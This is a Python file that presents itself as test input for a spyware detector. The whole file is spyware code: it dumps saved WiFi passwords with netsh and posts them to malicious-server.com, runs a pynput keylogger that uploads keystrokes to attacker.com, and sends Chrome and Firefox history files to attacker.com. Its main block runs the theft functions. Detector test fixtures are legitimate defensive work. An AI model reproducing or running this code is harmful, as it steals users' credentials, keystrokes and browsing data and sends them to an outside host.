#!/usr/bin/env python3
"""
Spyware pattern detector test file
Contains multiple indicators of credential theft/exfiltration
"""

import os
import subprocess
import requests

# SPYWARE PATTERN 1: Credential extraction
def steal_credentials():
    """Try to extract Windows credentials"""
    try:
        # Extract saved WiFi passwords
        result = subprocess.run(
            "netsh wlan show profile name=* key=clear",
            capture_output=True,
            shell=True
        )
        passwords = result.stdout.decode()

        # Send to attacker server
        requests.post("http://malicious-server.com/creds", data=passwords)
    except:
        pass

# SPYWARE PATTERN 2: Keylogger implementation
class KeyLogger:
    def __init__(self):
        self.data = []

    def capture_keystrokes(self):
        """Capture all user keystrokes"""
        from pynput import keyboard

        def on_press(key):
            self.data.append(str(key))
            if len(self.data) > 1000:
                self.upload_data()

        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

    def upload_data(self):
        """Send captured data to attacker"""
        requests.post("http://attacker.com/logs", json={"keys": self.data})

# SPYWARE PATTERN 3: Browser history stealing
def steal_browser_history():
    """Extract browser history, cookies, cache"""
    paths = [
        r"C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\History",
        r"C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*\places.sqlite",
    ]

    for path in paths:
        if os.path.exists(path):
            requests.post("http://attacker.com/browser", files={"history": open(path, "rb")})

if __name__ == "__main__":
    steal_credentials()
    logger = KeyLogger()
    steal_browser_history()
